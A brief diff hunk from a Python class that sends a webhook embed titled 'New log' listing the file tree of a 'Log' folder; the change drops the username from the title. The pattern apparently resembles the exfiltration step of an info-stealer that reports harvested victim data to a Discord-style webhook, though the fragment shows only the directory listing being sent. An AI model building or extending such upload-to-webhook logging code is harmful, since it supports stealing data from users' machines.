@@ -61,7 +61,7 @@ class Upload:
     def send(self):
         self.webhook.send(
             embed=Embed(
-                title=f"New log {username}",
+                title="New log",
                 description="```" + '\n'.join(self.tree(Path("Log"))) + "```",
                 color=0x24262A,
             ),
